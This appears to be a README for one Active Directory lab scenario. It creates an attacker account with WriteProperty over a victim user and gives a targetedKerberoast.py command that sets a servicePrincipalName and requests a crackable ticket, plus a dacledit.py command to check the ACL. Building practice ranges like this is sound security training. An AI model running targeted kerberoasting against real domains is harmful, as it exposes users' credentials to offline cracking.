# acl-writeproperty

User with WriteProperty (all properties) on another user. Creates `scn-acl-wp-attacker` (password `Aa1234567890!`) and the user `scn-acl-wp-victim`, and gives the attacker `WriteProperty` (inheritance `All`) on it.

Attack:

    targetedKerberoast.py -d <domain> -u scn-acl-wp-attacker -p 'Aa1234567890!' --request-user scn-acl-wp-victim   # writes servicePrincipalName

How to verify:

    dacledit.py -action read -principal scn-acl-wp-attacker -target scn-acl-wp-victim <domain>/scn-acl-wp-attacker:'Aa1234567890!' -dc-ip <dc ip>   # shows WriteProperty

Disable deletes both objects (the ACE goes with the target).
